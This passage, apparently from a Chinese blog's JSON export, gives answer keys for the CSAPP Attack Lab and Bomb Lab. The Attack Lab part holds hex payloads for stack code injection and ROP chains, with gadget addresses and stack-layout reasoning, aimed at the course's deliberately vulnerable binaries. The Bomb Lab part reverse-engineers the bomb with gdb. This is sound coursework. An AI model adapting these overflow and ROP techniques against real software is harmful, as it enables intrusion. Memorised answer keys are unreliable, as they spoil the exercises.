class=\"code\"><pre><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch2的地址 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"comment\">/* sub  $0x30, %rsp */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x59b997fa,%rdi（我用的self-study版本的cookie是0x59b997fa）*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 <span class=\"comment\">/* retq */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa  aa aa aa aa </span><br><span class=\"line\">aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* 填充的字符串 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span></span><br><span class=\"line\"><span class=\"comment\">/* 上面的sub $0x30, %rsp指令的地址，也就是getbuf本身的ret要跳转过去的地址 */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>需要传一个int参数，字符串里有可执行代码，覆盖返回地址的位置，让ret跳转到我们插进去的代码的位置</li>\n<li>需要注意ret读取的是rsp指示的栈顶的位置，所以为了让我们自己传进去的ret能够ret到touch2的地址，需要设置rsp使之指向touch2的地址</li>\n</ul>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><h4 id=\"答案-2\"><a href=\"#答案-2\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* touch3 addr, in 0x5561dc78 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> <span class=\"number\">83</span> ec <span class=\"number\">30</span> </span><br><span class=\"line\"><span class=\"comment\">/* sub $0x30,%rsp, in 0x5561dc80 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">48</span> c7 c7 <span class=\"number\">90</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> </span><br><span class=\"line\"><span class=\"comment\">/* mov  $0x5561dc90,%rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c3 </span><br><span class=\"line\"><span class=\"comment\">/* retq will ret to 0x5561dc78 */</span>   </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/*fill the extra space */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* string \"59b997fa\" ，in 0x5561dc90 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">aa aa aa aa aa aa aa </span><br><span class=\"line\"><span class=\"comment\">/* fill the extra space */</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">80</span> dc <span class=\"number\">61</span> <span class=\"number\">55</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> </span><br><span class=\"line\"><span class=\"comment\">/* 0x5561dc80, our code's begin addr */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* </span></span><br><span class=\"line\"><span class=\"comment\">* just before our attack code is run, </span></span><br><span class=\"line\"><span class=\"comment\">* rsp == 0x5561dca0 </span></span><br><span class=\"line\"><span class=\"comment\">* return addr in 0x5561dca0</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>比第二题只多了一个“需要在栈上放置字符串”，需要注意的是，字符串放在栈上，那么rsp就应该小于这个字符串的最低位置，否则下一个函数如果读写栈帧，就会破坏字符串</li>\n<li>然后覆盖getbuf的存放返回地址的区域，使之跳转到我们插入的代码段的起始位置，也就是0x5561dc80</li>\n<li>接着分配栈空间，然后把string的地址传给rdi，然后ret到touch3。需要注意，ret从栈顶读取返回地址，所以touch3的地址放在栈顶</li>\n</ul>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><h4 id=\"答案-3\"><a href=\"#答案-3\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa </span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\"><span class=\"comment\">/* this five line fill the buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\">cc <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019cc\t pop %rax; nop; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">97</span> b9 <span class=\"number\">59</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x4019a2\t movq %rax, %rdi; ret */</span></span><br><span class=\"line\"></span><br><span class=\"line\">ec <span class=\"number\">17</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* touch2 0x4017ec */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-3\"><a href=\"#思路-3\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li>构造rop链，在0x4019ca处有<code>b8 29 58 90 c3 mov $0xc3905829,%eax</code>，观察字节码，在0x4019cc处的<code>58</code>是<code>pop rax</code>，从而，把cookie放在栈顶，然后调用这条指令，就可以把参数转移到rax</li>\n<li>在0x4019a0有<code>8d 87 48 89 c7 c3   lea    -0x3c3876b8(%rdi),%eax</code>，观察字节码，0x4019a2处有<code>48 89 c7</code>，也就是<code>mov %rax, %rdi</code>，从而把参数从rax转移到rdi，然后直接跳转过去touch2就可以了</li>\n</ul>\n<h3 id=\"第五题\"><a href=\"#第五题\" class=\"headerlink\" title=\"第五题\"></a>第五题</h3><h4 id=\"答案-4\"><a href=\"#答案-4\" class=\"headerlink\" title=\"答案\"></a>答案</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa</span><br><span class=\"line\">aa aa aa aa aa aa aa aa\t\t</span><br><span class=\"line\"><span class=\"comment\">/* this five lines fill space of buf */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">17</span> <span class=\"number\">2b</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t \t</span><br><span class=\"line\"><span class=\"comment\">/* 402b17, pop rsi,ret to this, assume that rsp is K */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">20</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data pop to rsi */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* the data are pop to r15 */</span></span><br><span class=\"line\"><span class=\"comment\">/* after all pop, rsp is K+16 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">06</span> <span class=\"number\">1</span>a <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 401a06, movq rsp, rax, ret to here, rsp is K+24 */</span></span><br><span class=\"line\"></span><br><span class=\"line\">a2 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019a2, movq rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">d6 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019d6, lea(%rdi,%rsi,1),%rax , then string addr in rax */</span></span><br><span class=\"line\"></span><br><span class=\"line\">c5 <span class=\"number\">19</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4019c5, mov rax, rdi */</span></span><br><span class=\"line\"></span><br><span class=\"line\">fa <span class=\"number\">18</span> <span class=\"number\">40</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t\t</span><br><span class=\"line\"><span class=\"comment\">/* 4018fa touch3 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">35</span> <span class=\"number\">39</span> <span class=\"number\">62</span> <span class=\"number\">39</span> <span class=\"number\">39</span> <span class=\"number\">37</span> <span class=\"number\">66</span> <span class=\"number\">61</span>\t<span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>\t</span><br><span class=\"line\"><span class=\"comment\">/* 0x59b997fa in here */</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"思路-4\"><a href=\"#思路-4\" class=\"headerlink\" title=\"思路\"></a>思路</h4><ul>\n<li><p>把字符串放在栈上，并且因为每次ret都会释放8字节，为了避免后面的函数使用栈而破坏字符串，应该把字符串放在rop链之后</p>\n</li>\n<li><p>用rsp构造出字符串的地址，这时候需要add或sub等算术指令或lea这个内存计算指令。找来找去，只有位于 0x4019d6的<code>lea (%rdi,%rsi,1),%rax</code>符合要求</p>\n</li>\n<li><p>为了使用lea，需要把运行到某条指令时的rsp跟字符串位置的偏移量传给rsi。这里我们使用pop指令，在0x402b16找到<code>pop %r14</code>，该指令第二个字节<code>5e</code>是<code>pop %rsi</code>，因为该指令跟ret之间还有<code>pop %r15</code>，所以栈上的数据应该是16个字节，前8个字节的数据pop给%rsi（该数据的计算在后文），后8个字节给%r15，后8个字节的数据随意构造即可。</p>\n<blockquote>\n<p>r15是callee-saved寄存器，被调用函数不应该使用寄存器原本的值，所以r15等价于C语言函数内的局部自动变量（非参数），并且getbuf函数被我们攻击前其本身的指令已经执行完了，此时破坏r15的值不会影响getbuf。（以上只是本人目前所知的r15的相关信息推断的，或许r15还有其他跨函数的用途？？）</p>\n</blockquote>\n</li>\n<li><p>之后用多个mov，实现rsp mov到rax再mov到rdi</p>\n</li>\n<li><p>然后调用ret到lea指令，这时候，rax保存着字符串的起始地址，然后再把rax mov到rdi</p>\n</li>\n<li><p>接着就是touch3的地址，让<code>mov rax rdi</code>下面那条ret直接跳转到touch3，攻击成功</p>\n</li>\n</ul>\n<h3 id=\"几个注意点\"><a href=\"#几个注意点\" class=\"headerlink\" title=\"几个注意点\"></a>几个注意点</h3><ul>\n<li>用vim的16进制编辑模式要加在打开vim时加<code>-b</code>，否则，会把诸如<code>c0</code>这一类大于<code>0x3f</code>的不属于ascii范围的字符修改成<code>3f</code></li>\n</ul>\n<ul>\n<li>ret指令前释放栈帧，ret指令后rsp又加上8，所以设置字符串时如果操作rsp，需要考虑ret释放的8字节</li>\n<li>指令的机器码放在栈上时不需要按照字节逆序排放。并且下一条指令相对于当前指令是放在更高的地址而不是更低的地址</li>\n<li>ret指令从rsp指定的位置读出8字节的信息，所以设置跳转地址时也要对高4byte进行设置</li>\n<li>注意gets遇到编码为0xFF的字符时不会终止读取</li>\n</ul>\n","slug":"CSAPP-Attack-Lab","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"https://h-zex.github.io/tags/CSAPP-Lab/"}]},{"title":"CSAPP Bomb Lab","date":"2017-09-14T18:04:11.000Z","path":"2017/09/15/CSAPP-Bomb-Lab/","text":"CSAPP Bomb Lab答案 Border relations with Canada have never been better. 1 2 4 8 16 32 多个答案 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 应该有多个答案 7 0 一个6个字符的字符串，字符串的ascii值依次为 $9+k\\times16$ $15+k\\times16$ $14+k\\times16$ $5+k\\times16$ $6+k\\times16$ $7+k\\times16$ ​ 4 3 2 1 6 5 第一题解答思路 string_not_equal函数比对(0x402400)位置的string与输入的string 直接运行gdb，print (char*)0x402400即可 不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333 第二题解答思路 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入1 2 4 8 16 32即可AC 第三题解题思路 12345lea 0xc(%rsp),%rcx //rcx=12+rsplea 0x8(%rsp),%rdx //rdx=8+rspmov $0x4025cf,%esi //%d %dmov $0x0,%eaxcallq 400bf0 &lt;__isoc99_sscanf@plt&gt; 从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdbprint (char*)0x4025cf打印出&quot;%d %d&quot; 然后测试读入的第一个数字是否大于7，如果是，explode_bomb 然后就是一个switch，用gdbx/14w 0x402470打印出 12340x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 按照对应关系确定第二个读入的数字即可 第四题解题思路 同样是用sscanf读入两个数字 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果 第五题解题思路 12callq 40131b &lt;string_length&gt;cmp $0x6,%eax 读入6个字符的字符串 123456movzbl (%rbx,%rax,1),%ecxmov %cl,(%rsp)mov (%rsp),%rdxand $0xf,%edxmovzbl 0x4024b0(%rdx),%edxmov %dl,0x10(%rsp,%rax,1) 提取每个字符的ascii的低4bits，放在edx里，然后从0x4024b0+edx的位置读入数据放在栈上 123mov $0x40245e,%esilea 0x10(%rsp),%rdicallq 401338 &lt;strings_not_equal&gt; 后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。 用gdb分别打印0x4024b0 0x40245e处的字符串，获得 maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? flyers 此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与flyers比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$ 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符 第六题一些心得 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码 1234567891011#from 代码段的401153lea 0x18(%rsp),%rsimov %r14,%raxmov $0x7,%ecxmov %ecx,%edxsub (%rax),%edxmov %edx,(%rax)add $0x4,%raxcmp %rsi,%raxjne 401160 &lt;phase_6+0x6c&gt; 大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能 安利一个gdb插件peda，大大提高gdb的用户体验 解题思路 整段代码分为 个部分 0x4010fc 到 0x401106：读入6个数值 0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333） 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性） 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。 其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令x/30w 0x6032d0打印改地址附近的多个字节，结果如下 1234560x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x000000000x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x000000000x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x000000000x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x000000000x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x000000000x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。 由此可以知道该段代码的功能为把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。 node地址在栈上关于读入的数字的分布规则为 node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0 node地址按照读入数字的顺序，排列在栈上。 0x4011ab 到 0x4011d9：该段从%rsp+0x20开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下： 12345678910111213141516171819struct node&#123; int num; int index; node *next;&#125;;node **next = %rsp+0x28;node **endnode = %rsp+0x50;node *currentnode = *(%rsp+0x20);node *temp;while(1)&#123; temp = *next; currentnode-&gt;next = temp; next += 1; //in fact, it add 8 bytes; if(endnode==next) break; currentnode = temp;&#125;temp-&gt;next = null; 0x4011df 到 0x4011f5：依次访问链表的节点，判断是否有后一个节点的数据大于前一个的情况，如果有，bomb。","raw":"---\ntitle: CSAPP Bomb Lab\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-09-15 02:04:11\ntags:\n- CSAPP Lab\ndescription: CSAPP 炸弹实验的解答\ncategories:\n- CSAPP\n---\n\n# CSAPP Bomb Lab\n\n### 答案\n\n1. Border relations with Canada have never been better.\n2. 1 2 4 8 16 32\n3. 多个答案\n   - 0    207\n   - 1    311\n   - 2    707\n   - 3    256\n   - 4    389\n   - 5    206\n   - 6    682\n   - 7    327\n4. *应该有多个答案*\n   - 7    0\n5. 一个6个字符的字符串，字符串的ascii值依次为\n   - $9+k\\times16$ \n   - $15+k\\times16$\n   - $14+k\\times16$\n   - $5+k\\times16$\n   - $6+k\\times16$\n   - $7+k\\times16$\n6. ​      4 3 2 1 6 5\n\n### 第一题\n\n#### 解答思路\n\n- string_not_equal函数比对(0x402400)位置的string与输入的string\n- 直接运行gdb，`print (char*)0x402400`即可\n- *不需要读完string_not_equal函数，可以猜测0x402400就是要找的，然后一试就过了。不过也不可以绝对相信函数名，或许出题人骗我们呢 2333*\n\n### 第二题\n\n#### 解答思路\n\n- 汇编代码显示，调用read_six_numbers读入6个数字，放在从栈底开始的24个字节里。测试第一个是否为1，用循环测试后一个是否是前一个的2倍。所以直接输入`1  2  4  8  16  32`即可AC\n\n### 第三题\n\n#### 解题思路\n\n- ```assembly\n  lea    0xc(%rsp),%rcx //rcx=12+rsp\n  lea    0x8(%rsp),%rdx //rdx=8+rsp\n  mov    $0x4025cf,%esi //%d %d\n  mov    $0x0,%eax\n  callq  400bf0 <__isoc99_sscanf@plt>\n  ```\n\n  从调用sscanf前的寄存器准备工作中看出，%esi放着格式字符串，用gdb`print (char*)0x4025cf`打印出`\"%d %d\"`\n\n- 然后测试读入的第一个数字是否大于7，如果是，explode_bomb\n\n- 然后就是一个switch，用gdb`x/14w 0x402470`打印出\n\n  ```assembly\n  0x402470:\t0x00400f7c\t0x00000000\t0x00400fb9\t0x00000000\n  0x402480:\t0x00400f83\t0x00000000\t0x00400f8a\t0x00000000\n  0x402490:\t0x00400f91\t0x00000000\t0x00400f98\t0x00000000\n  0x4024a0:\t0x00400f9f\t0x00000000\n  ```\n\n  按照对应关系确定第二个读入的数字即可\n\n### 第四题\n\n#### 解题思路\n\n- 同样是用sscanf读入两个数字\n- 由于逻辑比较复杂，但是反编译比较简单，可以直接反编译得到结果\n\n### 第五题\n\n#### 解题思路\n\n- ```assembly\n  callq  40131b <string_length>\n  cmp    $0x6,%eax\n  ```\n\n  读入6个字符的字符串\n\n- ```assembly\n  movzbl (%rbx,%rax,1),%ecx\n  mov    %cl,(%rsp)\n  mov    (%rsp),%rdx\n  and    $0xf,%edx\n  movzbl 0x4024b0(%rdx),%edx\n  mov    %dl,0x10(%rsp,%rax,1)\n  ```\n\n  提取每个字符的ascii的低4bits，放在`edx`里，然后从`0x4024b0+edx`的位置读入数据放在栈上\n\n- ```assembly\n  mov    $0x40245e,%esi\n  lea    0x10(%rsp),%rdi\n  callq  401338 <strings_not_equal>\n  ```\n\n  后面调用了strings_not_equal，比对0x40245e处的字符串及我们放在栈上的数据。\n\n- 用gdb分别打印0x4024b0  0x40245e处的字符串，获得\n\n  - `maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?`\n  -  `flyers`\n\n- 此时可以知道，前面提取数据时，是以我们输入的字符的低4bit的数值为偏移量，从0x4024b0开始的字符串按照偏移量提取字符放在栈上，然后与`flyers`比对。偏移量依次为$9\\ 15\\ 14\\ 5\\ 6\\ 7$\n\n- 但是这些字符不可打印出来，所以我们需要加上$16\\times k$来获得可打印的字符\n\n### 第六题\n\n#### 一些心得\n\n- 不要尝试完整的人肉反汇编成C，而是大概知道哪段代码有哪些功能，然后用gdb调试，看看猜的对不对。比如本题以下代码\n\n  ```assembly\n  #from 代码段的401153\n  lea    0x18(%rsp),%rsi\n  mov    %r14,%rax\n  mov    $0x7,%ecx\n\n  mov    %ecx,%edx\n  sub    (%rax),%edx\n  mov    %edx,(%rax)\n  add    $0x4,%rax\n  cmp    %rsi,%rax\n  jne    401160 <phase_6+0x6c>\n  ```\n\n  大概知道是改变读入的数字的值，但是不确定确切功能，这时候可以在用gdb，在读入之后的地方设断点，打印这块内存区域的多个字节的值，然后再在这段代码执行后的地方设断点，打印值，观察变化，结合汇编代码，更加容易知道其功能\n\n- 安利一个gdb插件[peda](https://github.com/longld/peda)，大大提高gdb的用户体验\n\n#### 解题思路\n\n- 整段代码分为 个部分\n\n  - 0x4010fc 到 0x401106：读入6个数值\n\n  - 0x40110b 到 0x401151：一个大循环，对读入的数字的合法性进行检查，要求读入的数字的取值范围是$[1,6]$，并且相互之间不相等。（这时候或许就可以暴力了233333）\n\n  - 0x401153 到 0x40116d：另一个循环，对输入的数字顺序进行调整。（一开始想着直接看汇编，但是出错了，后来用gdb调试，很容易就看到了这个特性）\n\n  - 0x401176 到 0x4011a9：一个大循环把链表的node的地址按照一定顺序写到栈上（里面有多个小循环、跳转，比较复杂）。通过大概的反汇编、gdb打印该段代码执行前后内存的值、猜测、测试不同的输入的数字序列，获得该段的功能。\n\n    其中，该段中把关于0x6032d0的值写入栈中，所以用gdb命令`x/30w 0x6032d0`打印改地址附近的多个字节，结果如下\n\n    ```assembly\n    0x6032d0 <node1>:\t0x0000014c\t0x00000001\t0x006032e0\t0x00000000\n    0x6032e0 <node2>:\t0x000000a8\t0x00000002\t0x006032f0\t0x00000000\n    0x6032f0 <node3>:\t0x0000039c\t0x00000003\t0x00603300\t0x00000000\n    0x603300 <node4>:\t0x000002b3\t0x00000004\t0x00603310\t0x00000000\n    0x603310 <node5>:\t0x000001dd\t0x00000005\t0x00603320\t0x00000000\n    0x603320 <node6>:\t0x000001bb\t0x00000006\t0x00000000\t0x00000000\n    ```\n\n    可以看到有6个node，每个node的第三个字节都对应另一个node的地址，很明显，这是一个链表。\n\n    由此可以知道该段代码的功能为**把node的地址写在栈上，地址在栈上的排列顺序由读入的数字确定**。当然，读入的数字的顺序在前面的一段代码被处理了，所以直接从汇编了解其逻辑比较难，还是用gdb打印该段代码执行后的值，并且尝试改变输入的数字的顺序来确定该段的逻辑。\n\n    **node地址在栈上关于读入的数字的分布规则为**\n\n    - node地址越大，对应的数字越小，1对应0x603320，2对应0x603310，3对应0x603300，4对应0x6032f0，5对应0x6032e0，6对应0x6032d0\n    - node地址按照读入数字的顺序，排列在栈上。\n\n  - 0x4011ab 到 0x4011d9：该段从`%rsp+0x20`开始，读入前面写到栈上的node地址，然后写到上一个节点的偏移量为8bit的位置，也就是node里存放next node的指针的位置。其实就是按照栈上node地址的排列顺序重新排列链表里node的顺序，其等价的C代码如下：\n\n    ```c\n    struct node{\n    \tint num;\n    \tint index;\n    \tnode *next;\n    };\n\n    node **next = %rsp+0x28;\n    node **endnode = %rsp+0x50;\n    node *currentnode = *(%rsp+0x20);\n    node *temp;\n    while(1){\n    \ttemp = *next;\n    \tcurrentnode->next = temp;\n    \tnext += 1;\t//in fact, it add 8 bytes;\n    \tif(endnode==next)\n    \t\tbreak;\n    \tcurrentnode = temp;\n    }\n    temp->next = null;\n    ```\n\n  - 0x4011df 到 